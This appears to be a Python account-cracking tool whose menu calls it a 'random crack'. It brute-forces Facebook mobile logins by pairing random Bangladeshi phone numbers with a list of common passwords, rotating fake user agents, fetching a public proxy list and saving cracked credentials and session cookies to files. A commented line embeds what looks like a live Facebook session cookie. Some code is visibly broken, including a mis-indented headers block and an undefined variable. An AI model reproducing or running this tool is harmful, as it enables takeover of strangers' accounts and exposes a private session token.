#__________________| INFO |___________________#
#______FOLLOW MY GITHUB 
#______CODING BY: tanvirhossanniloy
#______GITHUB : https://github.com/tanvirhossanniloy
#________________| SCRIPT DATA |_____________#


import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Redmi Note 6 Pro'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate \033[0;34mby NILOY \033[0;32mvai...............')
print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mupdate \033[0;32mdone.............')
print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32m  ............')
logo = ("""
   _,  _, __,   __,    ____,  _  _, 
(-|\ | (-|   (-|    (-/  \ (-\_/  
 _| \|, _|_,  _|__,  _\__/,  _|,  
(      (     (      (       (
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92𝚖NILOY
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mTanvir Hossan Niloy🙂💔🪽
[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mRANDOM
[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92m𝙵𝚁𝙴𝙴 
[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32m𝚅2.9\033[1;35m]
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═ """)
 

 
def mrdevilex():
	print('==================================================')
 
def Main():
        os.system("clear")
        print(logo)
        print(" [1] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊")
        os.system('xdg-open https://www.facebook.com/tor.abbu.niloy.12');time.sleep(1)
        print(" [0] 𝐄𝐗𝐈𝐓")
        MrDevilEx =input("\n [?] 𝐂𝐇𝐎𝐎𝐒𝐄 : ")
        if MrDevilEx in ["1","01"]:
            fuck()
        if MrDevilEx in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 𝐂𝐎𝐃𝐄: 017, 018, 019, 016')
    code = input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐃𝐄 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄: 2000 3000 5000 10000 ')
    limit = int(input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as DEVIL:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃: '+tl)
        print("[+] 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄: "+code)
        print('[+] 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃  »»» 𝐕.2.09')
        print('[+] 𝐔𝐒𝐄 𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝐅𝐎𝐑 𝐒𝐏𝐄𝐄𝐃 𝐔𝐏 » NILOY 𝐁𝐫𝐚𝐧𝐝')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','FREE FIRE','free fire','i love you','bangla','09876543','@#@#@#','আমি তোমাকে ভালোবাসি','BANGLADESH','Bangladesh','bangladesh','Free fire','freefire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','Ramjan','Md Jahidul Islam','Jahidul','Shakil','Badsha','Tanjila','Rashel','Mohammad','113355','22334455','121235','1234567890']
            DEVIL.submit(MrDevilEx2,uid,pwx,tl)
    print('==================================================')
    print(' [+] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')
    print(' [+] OK Ids saved in NILOY/OK.txt')
    print(' [+] CP Ids saved in NILOY/CP.txt')
    print('==================================================')
def MrDevilEx2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[NILOY]--[%s/%s]--[NILOY-𝐎𝐊%s]~[NILOY-𝐂𝐏-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
             headers = { 'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', # 'cookie': 'datr=oKOJZmH9zZLcwkUtn22rnhIx; sb=oKOJZiJ1c9wTuNb6knXwdrcw; m_pixel_ratio=2; c_user=100033732818929; xs=46%3ANck1KxOSurw6sw%3A2%3A1720296401%3A-1%3A5315; locale=en_GB; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2552%3Btimestamp%3A1720296424; fbl_st=100636511%3BT%3A28671607; vpd=v1%3B386x360x2; m_page_voice=100033732818929; zsh=ASSJwBPmd-59POK__HYHRlshyvB7ueGp1gTPGjihmFPC-zy7_dh_xxUu3PCi3jv2YVgJo7KkoRDn4RLgEWvXziDxFjqBtjIOSzIW4DHPA9S0Hdv_rm2rEOD5GqG1EiAriKKQRqNk_sZxb5cRl4Z5rLW5ulN6KfuWmiw1eG1_b2IBMvsmM_k7JPcuy1cdApZ9s_wIzCAJk4hfZYAHBnox_JxodoPPe3FJsdFYYQPf84MpvdV-dpUZXzVh9X39Rsz5Dv4-yLnPddkqw6QYmzfoO0NXVf-PUuq3zBMGHFr690QiSHzFEuD_44Yb1Bp0vgAuToH_jHI7; wd=360x670; fr=0iZWWXuum2u6YXiof.AWWHYbO4djKzFhbC6tKa6E5YDLw.BmiaOh..AAA.0.0.BmiaVw.AWUvwU-DdI4', 'dpr': '2', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"(Not(A:Brand";v="99", "Opera";v="107", "Chromium";v="124"', 'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Opera";v="107", "Chromium";v="124"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '"itel A661L"', 'sec-ch-ua-platform': '"macOS"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6272.206 Safari/537.36 OPR/107.0.4269.174', 'viewport-width': '980', }
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;92m[NILOY-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/NILOY/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\033[1;94m[Mahadi-CP] {cid}|{ps}")
                open('/sdcard/NILOY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
